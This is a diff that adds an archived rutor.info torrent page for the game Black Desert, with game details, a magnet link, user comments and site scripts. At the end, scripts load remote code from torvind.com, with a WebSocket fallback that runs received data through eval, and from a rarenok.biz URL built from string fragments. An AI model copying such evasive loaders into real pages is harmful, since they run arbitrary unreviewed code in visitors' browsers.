@@ -1,0 +1,362 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Black Desert [276396] (2015) PC | Online-only</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Black Desert [276396] (2015) PC | Online-only</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:248185f3bdf12903f82d20b537f7970a8524994a&amp;dn=rutor.info_Black+Desert+%5B276396%5D+%282015%29+PC+%7C+Online-only&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630476"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630476"><img src="http://s.rutor.info/t/down.png"> Скачать BlackDesert_276396.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><center><img src="http://i056.radikal.ru/1510/77/586e7281a615.png" /></center><br />
+<img src="http://i008.radikal.ru/1511/50/16309f29a903.jpg" style="float:right;" /><br />
+<br />
+<b>Год выпуска:</b> 2015<br />
+<b>Жанр:</b>  <a href="/tag/8/MMORPG" target="_blank">MMORPG</a>, <a href="/tag/8/Action" target="_blank">Action</a>, 3rd Person, <a href="/tag/8/Adventure" target="_blank">Adventure</a>, <a href="/tag/8/Online" target="_blank">Online</a><br />
+<b>Разработчик:</b> Pearl Abyss<br />
+<b>Издательство в России:</b> GameNet<br />
+<b>Версия:</b> <span style="color:green;">276396</span><br />
+<b>Тип издания:</b> Лицензия<br />
+<b>Язык интерфейса:</b> Русский<br />
+<b>Язык озвучки:</b> Русский<br />
+<b>Таблетка:</b> Не требуется<br />
+<br />
+<b>Системные требования:</b><br />
+<b>Операционная система:</b> Win XP/Vista/7/8 (32 или 64 бита);<br />
+<b>Процессор:</b> AMD/INTEL 2.5 Ггц и выше;<br />
+<b>Оперативная память:</b> 1 Гб и выше;<br />
+<b>Видеокарта:</b> GeForce 9800GT/Radeon HD 3850 и выше;<br />
+<b>DirectX:</b> 9.0c<br />
+<br />
+<br />
+<b>Black Desert</b>  — ролевая онлайн-игра с огромным бесшовным миром, ориентированная на ураганный экшн и населенная стильными персонажами с уникальной внешностью.<br />
+Вас ждут бесконечные приключения и множество увлекательных занятий: торговля, создание предметов, обустройство интерьера домов, и эпические осады с боевыми слонами, пушками и осадными лестницами, требующие слаженной командной работы.<br />
+Все это — с ультрасовременной графикой, роскошными пейзажами и динамической погодой.<br />
+<br />
+<b>Особенности игры:</b><br />
+Non-target action с активным блоком, возможностью уворачиваться и комбо-системой.<br />
+Комбинации ударов (большинство навыков привязаны к клавишам клавиатуры).<br />
+Использование прыжков, уклонов и блоков расходует выносливость.<br />
+У каждого класса есть уникальный тип энергии, расходуемый при использовании навыков.<br />
+<br />
+<br />
+<a href="http://s020.radikal.ru/i701/1511/01/e5dab5d15116.jpg" target="_blank"><img src="http://s020.radikal.ru/i701/1511/01/e5dab5d15116t.jpg" /></a> <a href="http://s004.radikal.ru/i207/1511/32/c0b8b7b60039.jpg" target="_blank"><img src="http://s004.radikal.ru/i207/1511/32/c0b8b7b60039t.jpg" /></a> <a href="http://s019.radikal.ru/i642/1511/b5/0d75a0e896ae.jpg" target="_blank"><img src="http://s019.radikal.ru/i642/1511/b5/0d75a0e896aet.jpg" /></a> <a href="http://i004.radikal.ru/1511/e9/5538aec426b8.jpg" target="_blank"><img src="http://i004.radikal.ru/1511/e9/5538aec426b8t.jpg" /></a><br />
+<a href="http://s017.radikal.ru/i438/1511/29/5952f0730cf8.jpg" target="_blank"><img src="http://s017.radikal.ru/i438/1511/29/5952f0730cf8t.jpg" /></a> <a href="http://s019.radikal.ru/i612/1511/ab/09e527e9c51c.jpg" target="_blank"><img src="http://s019.radikal.ru/i612/1511/ab/09e527e9c51ct.jpg" /></a> <a href="http://s020.radikal.ru/i709/1511/71/1ebe45da32c2.jpg" target="_blank"><img src="http://s020.radikal.ru/i709/1511/71/1ebe45da32c2t.jpg" /></a> <a href="http://s017.radikal.ru/i437/1511/77/c47d554db454.jpg" target="_blank"><img src="http://s017.radikal.ru/i437/1511/77/c47d554db454t.jpg" /></a><br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Установка и запуск игры</div><div class="hidebody"></div><textarea class="hidearea"><br />
+- Запустить установщик<br />
+- Установить <br />
+- Создать аккаунт<br />
+- Запустить ярлык на рабочем столе<br />
+- Выбрать папку, куда установлена игра (Например, C/Games/Black Desert) - После проверки файлов можно <br />
+<br />
+приступать к игре. <br />
+Скачивать игру повторно не нужно! </textarea></div></td></tr>
+
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/games" target="_blank">Игры </a></td></tr>
+<tr><td class="header">Раздают</td><td>6</td></tr>
+<tr><td class="header">Качают</td><td>1</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (24 минуты назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 12:38:33  (20 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>28.63&nbsp;GB  (30742384211 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630476);">закладки</span></td>
+</tr>
+
+
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630476.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (16)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630476">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630476);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630476);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630476">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>TheChosenOne</b></td> <td>08-05-2018 22:51:45 (10 часов назад)</td> <td></td> <td align="right"><span id="c_3199596"></span><script type="text/javascript">cOptions(1450136,3199596);</script></td></tr><tr><td class="c_t" colspan=4>а в какой по-твоему супер? </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Рабовладелец</b></td> <td>08-05-2018 16:31:33 (16 часов назад)</td> <td></td> <td align="right"><span id="c_3199430"></span><script type="text/javascript">cOptions(1506640,3199430);</script></td></tr><tr><td class="c_t" colspan=4>Играл - лажа полная. И графа не такая уж и супер.</td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
